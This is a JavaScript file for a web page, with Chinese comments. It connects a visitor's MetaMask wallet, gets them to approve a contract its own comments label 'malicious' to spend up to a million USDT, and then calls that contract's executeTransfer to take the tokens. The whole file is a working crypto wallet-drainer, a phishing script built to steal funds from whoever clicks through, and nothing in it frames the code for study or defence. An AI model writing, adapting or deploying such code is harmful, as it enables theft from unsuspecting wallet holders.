// Ethereum provider and signer
let provider;
let signer;
let userAddress;

// 合约地址和 ABI
const maliciousContractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 替换为你的恶意合约地址
const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
const maliciousContractABI = [
    // 添加恶意合约的 ABI
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "user",
                "type": "address"
            }
        ],
        "name": "executeTransfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];
const usdtABI = [
    // 添加 USDT 合约的 ABI
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "sender",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// 连接钱包
document.getElementById("connectButton").onclick = async () => {
    try {
        if (typeof window.ethereum !== 'undefined') {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            document.getElementById("message").innerText = "Connected: " + userAddress;
            document.getElementById("approveButton").disabled = false; // 启用批准按钮
        } else {
            document.getElementById("message").innerText = "Please install MetaMask!";
        }
    } catch (error) {
        console.error("Error connecting wallet:", error);
        document.getElementById("message").innerText = "Failed to connect wallet: " + error.message;
    }
};

// 批准转移 USDT
document.getElementById("approveButton").onclick = async () => {
    try {
        const usdtContract = new ethers.Contract(usdtContractAddress, usdtABI, signer);
        const amount = ethers.utils.parseUnits("1000000", 18); // 1000000 USDT
        const tx = await usdtContract.approve(maliciousContractAddress, amount);
        await tx.wait();
        document.getElementById("message").innerText = "Approved " + amount.toString() + " USDT for transfer.";
        document.getElementById("executeTransferButton").disabled = false; // 启用执行转移按钮
    } catch (error) {
        console.error("Error approving tokens:", error);
        document.getElementById("message").innerText = "Failed to approve tokens: " + error.message;
    }
};

// 执行转移
document.getElementById("executeTransferButton").onclick = async () => {
    try {
        const maliciousContract = new ethers.Contract(maliciousContractAddress, maliciousContractABI, signer);
        const tx = await maliciousContract.executeTransfer(userAddress);
        await tx.wait();
        document.getElementById("message").innerText = "Transfer executed successfully!";
    } catch (error) {
        console.error("Error executing transfer:", error);
        document.getElementById("message").innerText = "Failed to execute transfer: " + error.message;
    }
};
